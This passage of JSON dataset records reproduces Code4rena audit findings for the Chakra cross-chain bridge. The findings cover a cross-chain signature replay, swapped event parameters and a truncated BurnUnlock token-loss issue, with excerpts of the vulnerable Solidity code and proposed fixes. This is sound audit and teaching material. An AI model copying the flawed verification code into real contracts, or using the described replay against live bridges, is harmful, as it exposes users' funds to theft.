to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) external {\n@>      verifySignature(\n            txid,\n            from_handler,\n            to_handler,\n            status,\n            sign_type,\n            signatures\n        );\n@>      processCrossChainCallback(\n            txid,\n            from_chain,\n            from_handler,\n            to_handler,\n            status,\n            sign_type,\n            signatures\n        );\n        emitCrossChainResult(txid);\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L285-L301\n```solidity\n    function verifySignature(\n        uint256 txid,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal view {\n        bytes32 message_hash = keccak256(\n@>          abi.encodePacked(txid, from_handler, to_handler, status)\n        );\n\n        require(\n@>          signature_verifier.verify(message_hash, signatures, sign_type),\n            \"Invalid signature\"\n        );\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L303-L331\n```solidity\n    function processCrossChainCallback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal {\n        require(\n            create_cross_txs[txid].status == CrossChainMsgStatus.Pending,\n            \"Invalid transaction status\"\n        );\n\n        if (\n@>          ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status;\n        } else {\n            create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L365-L396\n```solidity\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        CrossChainMsgStatus status,\n        uint8 /* sign_type */, // validators signature type /  multisig or bls sr25519\n        bytes calldata /* signatures */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n@>      if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n\n        require(\n            create_cross_txs[txid].status == CrossChainTxStatus.Pending,\n            \"invalid CrossChainTxStatus\"\n        );\n\n        if (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n\n        if (status == CrossChainMsgStatus.Failed) {\n            create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n        }\n\n        return true;\n    }\n```\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nThe `ChakraSettlement.receive_cross_chain_msg` and `ChakraSettlement.receive_cross_chain_callback` functions can be updated to check if the receiving `ChakraSettlement` contract's `contract_chain_name` matches the `to_chain` associated with the respective `txid` input and revert if not matched.\n\n\n## Assessed type\n\nOther\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L170-L244\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L300-L355\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L256-L283\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L285-L301\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L303-L331\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L365-L396\n\n\n# Vulnerability details\n\n## Impact\nBecause the `ChakraSettlement.receive_cross_chain_msg` function does not ensure that the receiving `ChakraSettlement` contract's `contract_chain_name` must match the `to_chain` corresponding to its `txid` input, the signatures that should only be used for calling the `ChakraSettlement.receive_cross_chain_msg` function on `to_chain` A can also be allowed to be used on `to_chain` B. As a result, the handler on `to_chain` B can incorrectly mint or transfer tokens to recipients though such recipients should only receive such token amounts on `to_chain` A and not on `to_chain` B.\n\nSimilarly, since the `ChakraSettlement.receive_cross_chain_callback` function does not ensure that the receiving `ChakraSettlement` contract's `contract_chain_name` must match the `to_chain` associated with its `txid` input, the signatures that should only be used for calling the `ChakraSettlement.receive_cross_chain_callback` function on `to_chain` A can also be allowed to be used on `to_chain` B. As a result, `to_chain` B's handler's `receive_cross_chain_callback` function logics can be incorrectly triggered, such as burning the corresponding token amount held by such handler on `to_chain` B under the `MintBurn` mode though such token amount should only be burned on `to_chain` A and not on `to_chain` B.\n\n## Proof of Concept\nWhen a validator is deterministically deployed, it can have the same address on different chains. When a handler is deterministically deployed, it can have the same address on different chains. Therefore, it is possible that the validators have the same addresses on two different `to_chain` chains while the number of required validators are the same on both chains, and the handler has the same address on these two `to_chain` chains as well. Moreover, such handler can whitelist the same `from_chain`-`from_handler` combination on both `to_chain` chains.\n\nSuppose such situation occurs for `to_chain` A and B, the validators on `to_chain` A can sign for a cross-chain message in which such signatures should only be used on `to_chain` A and should not be allowed to be used on `to_chain` B. However, since the `ChakraSettlement.receive_cross_chain_msg` function does not ensure that the receiving `ChakraSettlement` contract's `contract_chain_name` must match the `to_chain` corresponding to its `txid` input, the `ChakraSettlement.receive_cross_chain_msg` function on `to_chain` B can be successfully called with the `txid`, `from_chain`, `from_address`, `from_handler`, `to_handler`, and `payload`, which were encoded in the signed message hash for the signatures that should only be used on `to_chain` A.\n\nIn this case:\n- `signature_verifier.verify(message_hash, signatures, sign_type)` would return `true` because the corresponding validators, which signed the signatures for `to_chain` A, have the same addresses on both `to_chain` A and B, and both chains have the same number of required validators;\n- `ISettlementHandler(to_handler).receive_cross_chain_msg` would be called successfully because the corresponding `to_handler` that is encoded for the signatures to be used on `to_chain` A also exists on `to_chain` B with the same address;\n- `is_valid_handler(from_chain, from_handler)` would be `true` when further calling the `ChakraSettlementHandler.receive_cross_chain_msg` function because the `from_chain`-`from_handler` combination that is encoded for the signatures to be used on `to_chain` A is also whitelisted by such `to_handler` on `to_chain` B.\n\nThus, such `ChakraSettlement.receive_cross_chain_msg` function call on `to_chain` B would be successful, which causes such signatures that should only be used for calling the `ChakraSettlement.receive_cross_chain_msg` function on `to_chain` A to also be allowed to be used on `to_chain` B.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L170-L244\n```solidity\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n        {\n            // verify signature\n@>          bytes32 message_hash = keccak256(\n@>              abi.encodePacked(\n@>                  txid,\n@>                  from_chain,\n@>                  from_address,\n@>                  from_handler,\n@>                  to_handler,\n@>                  keccak256(payload)\n@>              )\n@>          );\n\n@>          require(\n@>              signature_verifier.verify(message_hash, signatures, sign_type),\n@>              \"Invalid signature\"\n@>          );\n\n            require(\n                receive_cross_txs[txid].status == CrossChainMsgStatus.Unknow,\n                \"Invalid transaction status\"\n            );\n        }\n\n        receive_cross_txs[txid] = ReceivedCrossChainTx(\n            txid,\n            from_chain,\n            contract_chain_name,\n            from_address,\n            from_handler,\n            address(this),\n            payload,\n            CrossChainMsgStatus.Pending\n        );\n\n@>      bool result = ISettlementHandler(to_handler).receive_cross_chain_msg(\n            txid,\n            from_chain,\n            from_address,\n            from_handler,\n            payload_type,\n            payload,\n            sign_type,\n            signatures\n        );\n\n        CrossChainMsgStatus status = CrossChainMsgStatus.Failed;\n        if (result == true) {\n            status = CrossChainMsgStatus.Success;\n            receive_cross_txs[txid].status = CrossChainMsgStatus.Success;\n        } else {\n            receive_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n\n        emit CrossChainHandleResult(\n            txid,\n            status,\n            contract_chain_name,\n            from_chain,\n            address(to_handler),\n            from_handler,\n            payload_type\n        );\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L300-L355\n```solidity\n    function receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n@>      if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n        bytes calldata msg_payload = MessageV1Codec.payload(payload);\n\n        require(isValidPayloadType(payload_type), \"Invalid payload type\");\n\n        if (payload_type == PayloadType.ERC20) {\n            // Cross chain transfer\n            {\n                // Decode transfer payload\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.LockUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n\n                    return true;\n                } else if (mode == SettlementMode.LockMint) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.BurnUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n            }\n        }\n\n        return false;\n    }\n```\n\nSimilarly, when the same situation occurs for `to_chain` A and B, the `ChakraSettlement.receive_cross_chain_callback` function on `to_chain` B can also be successfully called with the `txid`, `from_handler`, `to_handler`, and `status`, which were encoded in the signed message hash for the signatures that should only be used on `to_chain` A, because the `ChakraSettlement.receive_cross_chain_callback` function does not ensure that the receiving `ChakraSettlement` contract's `contract_chain_name` must match the `to_chain` associated with its `txid` input.\n\nFor the same reasons described for the case involving the `ChakraSettlement.receive_cross_chain_msg` function, calling the `ChakraSettlement.receive_cross_chain_callback` function in this case would cause `signature_verifier.verify(message_hash, signatures, sign_type)` to return `true`, `ISettlementHandler(to_handler).receive_cross_chain_callback` to be called successfully, and `is_valid_handler(from_chain, from_handler)` to be `true` when further calling the `ChakraSettlementHandler.processCrossChainCallback` function. Hence, such `ChakraSettlement.receive_cross_chain_callback` function call on `to_chain` B would be successful, which causes such signatures that should only be used for calling the `ChakraSettlement.receive_cross_chain_callback` function on `to_chain` A to also be allowed to be used on `to_chain` B.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L256-L283\n```solidity\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) external {\n@>      verifySignature(\n            txid,\n            from_handler,\n            to_handler,\n            status,\n            sign_type,\n            signatures\n        );\n@>      processCrossChainCallback(\n            txid,\n            from_chain,\n            from_handler,\n            to_handler,\n            status,\n            sign_type,\n            signatures\n        );\n        emitCrossChainResult(txid);\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L285-L301\n```solidity\n    function verifySignature(\n        uint256 txid,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal view {\n        bytes32 message_hash = keccak256(\n@>          abi.encodePacked(txid, from_handler, to_handler, status)\n        );\n\n        require(\n@>          signature_verifier.verify(message_hash, signatures, sign_type),\n            \"Invalid signature\"\n        );\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L303-L331\n```solidity\n    function processCrossChainCallback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal {\n        require(\n            create_cross_txs[txid].status == CrossChainMsgStatus.Pending,\n            \"Invalid transaction status\"\n        );\n\n        if (\n@>          ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status;\n        } else {\n            create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L365-L396\n```solidity\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        CrossChainMsgStatus status,\n        uint8 /* sign_type */, // validators signature type /  multisig or bls sr25519\n        bytes calldata /* signatures */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n@>      if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n\n        require(\n            create_cross_txs[txid].status == CrossChainTxStatus.Pending,\n            \"invalid CrossChainTxStatus\"\n        );\n\n        if (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n\n        if (status == CrossChainMsgStatus.Failed) {\n            create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n        }\n\n        return true;\n    }\n```\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nThe `ChakraSettlement.receive_cross_chain_msg` and `ChakraSettlement.receive_cross_chain_callback` functions can be updated to check if the receiving `ChakraSettlement` contract's `contract_chain_name` matches the `to_chain` associated with the respective `txid` input and revert if not matched.\n\n\n## Assessed type\n\nOther"}, "severity": "High", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-129", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 129, "page_start": null, "title": "`CrossChainHandleResult` event incorrectly emitted in `ChakraSettlement::receive_cross_chain_msg`", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/ChakraSettlement.sol#L55\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/ChakraSettlement.sol#L235\n\n\n# Vulnerability details\n\n## Impact\nThe `ChakraSettlement::CrossChainHandleResult` even is implemented as follows:\n\n#### [solidity/settlement/contracts/ChakraSettlement.sol - Line 55](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/ChakraSettlement.sol#L55)\n```solidity\n\n    // cross chain handle result emit by receive side\n    event CrossChainHandleResult(\n        uint256 indexed txid,\n        CrossChainMsgStatus status,\n        string from_chain,\n        string to_chain,\n        address from_handler,\n        uint256 to_handler,\n        PayloadType payload_type\n    );\n\n```\nHowever, `ChakraSettlement::receive_cross_chain_msg` appears to unecessarily switch the order of from_chain, to_chain and from_handler, to_handler. This may result in inaccurate events being emitted:\n\n#### [solidity/settlement/contracts/ChakraSettlement.sol - Line 235](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/ChakraSettlement.sol#L235)\n```solidity\n\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n\n          ...\n\n        emit CrossChainHandleResult(\n            txid,\n            status,\n            contract_chain_name, //the current current chain\n            from_chain, // should be to_chain\n            address(to_handler), //should be from_handler\n            from_handler, //should be to_handler\n            payload_type\n        );\n    }\n\n```\n\n## Tools Used\n\nFoundry, VScode\n\n## Recommended Mitigation Steps\n\n- Alter the emitted event as follows:\n\n```solidity\n\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n\n          ...\n\n        emit CrossChainHandleResult(\n            txid,\n            status,\n            from_chain,\n            contract_chain_name,\n            from_handler,\n            address(to_handler)\n            payload_type\n        );\n    }\n\n```\n\n\n## Assessed type\n\nOther\n", "sections": {"description_md": null, "impact_md": "## Impact\nThe `ChakraSettlement::CrossChainHandleResult` even is implemented as follows:\n\n#### [solidity/settlement/contracts/ChakraSettlement.sol - Line 55](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/ChakraSettlement.sol#L55)\n```solidity\n\n    // cross chain handle result emit by receive side\n    event CrossChainHandleResult(\n        uint256 indexed txid,\n        CrossChainMsgStatus status,\n        string from_chain,\n        string to_chain,\n        address from_handler,\n        uint256 to_handler,\n        PayloadType payload_type\n    );\n\n```\nHowever, `ChakraSettlement::receive_cross_chain_msg` appears to unecessarily switch the order of from_chain, to_chain and from_handler, to_handler. This may result in inaccurate events being emitted:\n\n#### [solidity/settlement/contracts/ChakraSettlement.sol - Line 235](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/ChakraSettlement.sol#L235)\n```solidity\n\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n\n          ...\n\n        emit CrossChainHandleResult(\n            txid,\n            status,\n            contract_chain_name, //the current current chain\n            from_chain, // should be to_chain\n            address(to_handler), //should be from_handler\n            from_handler, //should be to_handler\n            payload_type\n        );\n    }\n\n```\n", "recommendation_md": "## Recommended Mitigation Steps\n\n- Alter the emitted event as follows:\n\n```solidity\n\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n\n          ...\n\n        emit CrossChainHandleResult(\n            txid,\n            status,\n            from_chain,\n            contract_chain_name,\n            from_handler,\n            address(to_handler)\n            payload_type\n        );\n    }\n\n```\n\n\n## Assessed type\n\nOther\n", "poc_md": null, "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/ChakraSettlement.sol#L55\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/ChakraSettlement.sol#L235\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nFoundry, VScode\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/ChakraSettlement.sol#L55\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/ChakraSettlement.sol#L235\n\n\n# Vulnerability details\n\n## Impact\nThe `ChakraSettlement::CrossChainHandleResult` even is implemented as follows:\n\n#### [solidity/settlement/contracts/ChakraSettlement.sol - Line 55](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/ChakraSettlement.sol#L55)\n```solidity\n\n    // cross chain handle result emit by receive side\n    event CrossChainHandleResult(\n        uint256 indexed txid,\n        CrossChainMsgStatus status,\n        string from_chain,\n        string to_chain,\n        address from_handler,\n        uint256 to_handler,\n        PayloadType payload_type\n    );\n\n```\nHowever, `ChakraSettlement::receive_cross_chain_msg` appears to unecessarily switch the order of from_chain, to_chain and from_handler, to_handler. This may result in inaccurate events being emitted:\n\n#### [solidity/settlement/contracts/ChakraSettlement.sol - Line 235](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/ChakraSettlement.sol#L235)\n```solidity\n\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n\n          ...\n\n        emit CrossChainHandleResult(\n            txid,\n            status,\n            contract_chain_name, //the current current chain\n            from_chain, // should be to_chain\n            address(to_handler), //should be from_handler\n            from_handler, //should be to_handler\n            payload_type\n        );\n    }\n\n```\n\n## Tools Used\n\nFoundry, VScode\n\n## Recommended Mitigation Steps\n\n- Alter the emitted event as follows:\n\n```solidity\n\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n\n          ...\n\n        emit CrossChainHandleResult(\n            txid,\n            status,\n            from_chain,\n            contract_chain_name,\n            from_handler,\n            address(to_handler)\n            payload_type\n        );\n    }\n\n```\n\n\n## Assessed type\n\nOther\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/ChakraSettlement.sol#L55\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/ChakraSettlement.sol#L235\n\n\n# Vulnerability details\n\n## Impact\nThe `ChakraSettlement::CrossChainHandleResult` even is implemented as follows:\n\n#### [solidity/settlement/contracts/ChakraSettlement.sol - Line 55](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/ChakraSettlement.sol#L55)\n```solidity\n\n    // cross chain handle result emit by receive side\n    event CrossChainHandleResult(\n        uint256 indexed txid,\n        CrossChainMsgStatus status,\n        string from_chain,\n        string to_chain,\n        address from_handler,\n        uint256 to_handler,\n        PayloadType payload_type\n    );\n\n```\nHowever, `ChakraSettlement::receive_cross_chain_msg` appears to unecessarily switch the order of from_chain, to_chain and from_handler, to_handler. This may result in inaccurate events being emitted:\n\n#### [solidity/settlement/contracts/ChakraSettlement.sol - Line 235](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/ChakraSettlement.sol#L235)\n```solidity\n\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n        \n          ...\n\n        emit CrossChainHandleResult(\n            txid,\n            status,\n            contract_chain_name, //the current current chain\n            from_chain, // should be to_chain\n            address(to_handler), //should be from_handler\n            from_handler, //should be to_handler\n            payload_type\n        );\n    }\n\n```\n\n## Tools Used\n\nFoundry, VScode\n\n## Recommended Mitigation Steps\n\n- Alter the emitted event as follows:\n\n```solidity\n\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n        \n          ...\n\n        emit CrossChainHandleResult(\n            txid,\n            status,\n            from_chain,\n            contract_chain_name,  \n            from_handler, \n            address(to_handler)\n            payload_type\n        );\n    }\n\n```\n\n\n## Assessed type\n\nOther"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-140", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 140, "page_start": null, "title": "Permanent loss of user tokens on both chains if `BurnUnlock` mode fails because of flawed burning pattern", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L123-L124\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L325-L329\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L383-L389\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L129-L130\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L344-L348\n\n\n# Vulnerability details\n\n## Impact\n\nThe `BurnUnlock` mode in the `ChakraSettlementHandler` contract has a critical flaw that causes token loss on both chains. This happens because tokens are burned on the source chain before ensuring a successful unlock on the destination chain. This high-risk vulnerability can lead to significant financial loss and damage trust in the cross-chain bridge system.\n\n_Note that the same issue persists in the Cairo code._\n\n## Vulnerability Details\n\nIn the `ChakraSettlementHandler` contract, we got two modes that burns tokens in the bridging process:\n\n- `MintBurn`: Tokens are burned on the source chain and minted on the destination chain. This mode is used when you want to permenantly move tokens from one chain to another.\n\n- `BurnUnlock`: Tokens are burned on the source chain and unlocked on the destination chain. This mode is used when you want to move tokens from one chain to another and decrease the supply on the source chain.\n\nWe observe two distinct pattern of burning tokens in `MintBurn` vs `BurnUnlock` modes:\n\n### `MintBurn` mode:\n\n- Source chain (`cross_chain_erc20_settlement`): Tokens are locked instead of burned 